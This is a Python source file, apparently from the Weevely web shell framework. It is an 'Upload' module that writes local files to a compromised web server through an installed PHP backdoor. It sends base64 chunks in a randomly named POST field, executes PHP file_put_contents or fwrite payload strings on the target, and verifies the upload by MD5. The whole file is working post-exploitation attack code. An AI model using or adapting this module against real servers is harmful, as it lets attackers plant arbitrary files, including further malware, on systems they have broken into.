'''
Created on 23/set/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.vector import VectorList, Vector
from core.http.cmdrequest import CmdRequest, NoDataException
from base64 import b64encode
from random import choice
from hashlib import md5
from core.parameters import ParametersList, Parameter as P

classname = 'Upload'
   
   
def b64_chunks(l, n):
    return [b64encode(l[i:i+n]) for i in range(0, len(l), n)]
    
class Upload(Module):    
    '''Upload binary/ascii file to the target filesystem'''
    
    
    vectors = VectorList([
        Vector('shell.php', 'file_put_contents', "file_put_contents('%s', base64_decode($_POST['%s']), FILE_APPEND);"),
        Vector('shell.php', 'fwrite', '$h = fopen("%s", "a+"); fwrite($h, base64_decode($_POST["%s"])); fclose($h);')
        ])
    
    params = ParametersList('Upload a file to the target filesystem', vectors,
            P(arg='lpath', help='Local file path', required=True, pos=0),
            P(arg='rpath', help='Remote path', required=True, pos=1),
            P(arg='chunksize', help='Chunk size', default=1024, type=int)
            )
    
    def __init__(self, modhandler, url, password):
        Module.__init__(self, modhandler, url, password)    
        
        self.file_content = None
        
        self.rand_post_name = ''.join([choice('abcdefghijklmnopqrstuvwxyz') for i in xrange(4)])
        
        
    def __execute_payload(self, vector, parameters):
        
        content_chunks = parameters[0]
        file_local_md5 = parameters[1]
        remote_path = parameters[2]
        

        i=1
        for chunk in content_chunks:
            payload = vector.payloads[0] % (remote_path, self.rand_post_name)
            self.modhandler.load(vector.interpreter).set_post_data({self.rand_post_name : chunk})
            self.modhandler.load(vector.interpreter).run({0 : payload})
            i+=1
        
        self.modhandler.set_verbosity(6)    
        file_remote_md5 = self.modhandler.load('file.check').run({'rpath' : remote_path, 'mode' : 'md5'})
        self.modhandler.set_verbosity()
        if file_remote_md5 == file_local_md5:
            return True
        else:
            file_exists = self.modhandler.load('file.check').run({'rpath' : remote_path, 'mode' :'exists'})
            if file_exists:
                self.mprint('[!] [%s] MD5 hash of \'%s\' file mismatch' % (self.name, remote_path))
            
    def set_file_content(self, content):
        """Cleaned after use"""
        
        self.file_content = content

    def __chunkify(self, file_content, chunksize):
        
            
        content_len = len(file_content)
        if content_len > chunksize:
            content_chunks = b64_chunks(file_content, chunksize)
        else:
            content_chunks = [ b64encode(file_content) ]

        numchunks = len(content_chunks)
        if numchunks > 20:
            self.mprint('[%s] Warning: uploading %i bytes using %i requests. Increase \'chunksize\' to reduce time' % (self.name, content_len, numchunks) )
            
        return content_chunks        


    def run_module( self, local_path, remote_path, chunksize):
            
            
        if self.modhandler.load('file.check').run({'rpath' : remote_path, 'mode' : 'exists'}):
            raise ModuleException(self.name, "Remote file already exists, delete it with \':file.rm %s\'" % (remote_path))
                            
        if not self.file_content:
            try:
                local_file = open(local_path, 'r')
            except Exception, e:
                raise ModuleException(self.name,  "Open file '%s' failed" % (local_path))
            
            file_content = local_file.read()
        else:
            file_content = self.file_content[:]
            self.file_content = None
        
        file_local_md5 = md5(file_content).hexdigest()
        content_chunks = self.__chunkify(file_content, chunksize)
              
        vectors = self._get_default_vector2()
        if not vectors:
            vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
        
        for vector in vectors:
            response = self.__execute_payload(vector, [content_chunks,  file_local_md5, remote_path])
            if response:
                self.params.set_and_check_parameters({'vector' : vector.name})
                self.mprint('[%s] File \'%s\' uploaded using %i chunks of %i bytes' % (self.name, remote_path, len(content_chunks), chunksize))
                return response

        self.mprint ('[!] [%s] File \'%s\' upload failed. Check remote path write permissions' % ( self.name, remote_path))
    
            
        
